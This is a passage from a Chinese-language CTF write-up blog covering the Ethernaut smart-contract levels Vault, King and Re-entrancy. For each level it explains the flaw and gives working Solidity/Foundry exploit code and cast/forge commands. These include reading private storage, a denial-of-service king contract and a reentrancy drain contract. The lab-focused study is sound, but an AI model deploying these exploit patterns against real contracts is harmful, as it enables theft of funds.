&#125;&#125;\n\n\n\n思路审计之后需要得到构造函数的密码才能过关，但是变量属性是private，不过以太坊本质是区块链，所有都是透明的。所有我们可以查看状态变量知道密码。关于智能合约的StorageLayout可以查看资料库\nExp获取密码的方法：\n\n利用CheatCode\n利用etherScan\n利用cast storage [vault_address] [storage_slot]\n\n//第一步：拿到密码//第二部：调用函数改变lockedcontract VaultSolution is Script &#123;    Vault vault = Vault(0xf4f3Ef631C97B826C9118F489C9CE54171Dfce3c);    function run() public &#123;        vm.startBroadcast();        bytes32 leet = vm.load(address(vault), bytes32(uint256(1)));        vault.unlock(leet);        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\n\n\nKing// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract King &#123;    address king;    uint256 public prize;    address public owner;    constructor() payable &#123;        owner = msg.sender;        king = msg.sender;        prize = msg.value;    &#125;    receive() external payable &#123;        require(msg.value &gt;= prize || msg.sender == owner);        payable(king).transfer(msg.value);        king = msg.sender;        prize = msg.value;    &#125;    function _king() public view returns (address) &#123;        return king;    &#125;&#125;\n\n\n\n思路Dos的一种方式。对于合约接受ETH的知识点考察，一般接ETH有两个函数receive和fallback。既没有接收以太币也没有支付回退函数，则合约无法通过常规交易接收以太币并抛出异常。官方文档指出\n\n因为代码使用了transfer的方式发送ETH，所以可以利用这点，当提交实例给关卡时,使得关卡抛出异常，阻止王位的转让,\nExp发送ETH，成为国王，但是不写任何的接受ETH的函数\ncontract KingSolution is Script &#123;    King king = King(payable(InstanceAddress));    function run() public &#123;        vm.startBroadcast();        KingAttack attack = new KingAttack&#123;value: 0.0015 ether&#125;(king);        console.log(&quot;Old King:&quot;, king._king());        attack.beKing();        console.log(&quot;New King:&quot;, king._king());        vm.stopBroadcast();    &#125;&#125;contract KingAttack &#123;    King king;    constructor(King _king) payable &#123;        king = _king;    &#125;    function beKing() external &#123;        (bool success,) = address(king).call&#123;value: 0.001 ether&#125;(&quot;&quot;);        require(success, &quot;CALL FAILED&quot;);    &#125;    receive() external payable &#123;        require(msg.sender == address(this), &quot;no king&quot;);    &#125;&#125;\n\n\n\n\n\nRe-entrancy思路经典的重放攻击，利用recevie或者fallback进行无限套娃。直接把全部的钱取出来\nfunction withdraw(uint _amount) public &#123;    if(balances[msg.sender] &gt;= _amount) &#123; //首先检查sender的余额是否大于要提款的钱        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); // msg.sender是接收方的地址，合约利用Call的方式向msg.sender发送_amout数量的钱            if(result) &#123;                _amount;            &#125;        balances[msg.sender] -= _amount;     &#125;&#125;\n\n在以上存在漏洞的函数中，因为使用了Call,如果作为接受ETH的合约存在receive和fallback函数，就会执行这个函数存在的逻辑。当这两个特殊的回调函数再次执行withdraw就会反复取钱\n\nExp// SPDX-License-Identifier: MITpragma solidity ^0.8;interface IReentrancy &#123;    function donate(address) external payable;    function withdraw(uint256) external;&#125;contract Hack &#123;    IReentrancy private immutable target;    constructor() &#123;        target = IReentrancy(0xCa69aB382F26857c5508BAF2aC09F15ccFbD9B25);    &#125;    function attack() external payable &#123;        target.donate&#123;value: 1e15&#125;(address(this));        target.withdraw(1e15);        require(address(target).balance == 0, &quot;target balance &gt; 0&quot;);        selfdestruct(payable(msg.sender));    &#125;    receive() external payable &#123;        uint256 amount = min(1e15, address(target).balance);        if (amount &gt; 0) &#123;            target.withdraw(amount);        &#125;    &#125;    function min(uint256 x, uint256 y) private pure returns (uint256) &#123;        return x &lt;= y ? x : y;    &#125;&#125;\n\n首先部署攻击合约Hack\nforge create src/Attack.sol:Hack --account 0x1f --rpc-url $SEPOLIA_RPC_URL --etherscan-api-key $ETHERSCAN_KEY --broadcast\n\n\n大概的逻辑就是，首先利用Hack合约利用donate函数使得在实例合约中有余额，通过 withdraw()函数的第一层验证。再通过调用实例合约的withdraw()函数实现Re-entrancy attrack。当调用Hack合约中的\ncast send 0xeE911138B13E36DB6E1A2438092A40c0e339D489 &quot;attack&quot; --account 0x1f --rpc-url $SEPOLIA_RPC_URL --value 0.001ether --etherscan-api-key $ETHERSCAN_KEY\n\n为什么是用0.001ETH呢？因为实例地址本身创建之后就存在0.001ETH的余额\n\n可以看到首先Hack合约先发了0.001ETH给予实例合约，然后再触发Re-entrancy\n\n不用部署的Exp\ninterface IReentrance &#123;    function donate(address) external payable;    function withdraw(uint256) external;    function balanceOf(address) external view returns (uint256);&#125;contract ReEntrancySolution is Script &#123;    Reentrance re = Reentrance(0xE1280DB04f7C397BaBd478CA0EFc0f9293eE0927);    function run() public &#123;        vm.startBroadcast();        ReEntrancyAttack attack = new ReEntrancyAttack&#123;value: 0.001 ether&#125;(address(re));        attack.attack();        vm.stopBroadcast();    &#125;&#125;contract ReEntrancyAttack &#123;    IReentrance private immutable target;    constructor(address _instanceAddress) public payable &#123;        target = IReentrance(_instanceAddress);    &#125;    function attack() external &#123;        target.donate&#123;value: 0.001 ether&#125;(address(this));        target.withdraw(0.001 ether);    &#125;    receive() external payable &#123;        uint256 balance = target.balanceOf(address(this));        if (balance &gt; 0) &#123;            target.withdraw(balance);        &#125;    &#125;&#125;\n","categories":["CTF-Ethernaut Writeups"],"tags":["Web3 Security","Ethernaut"]}]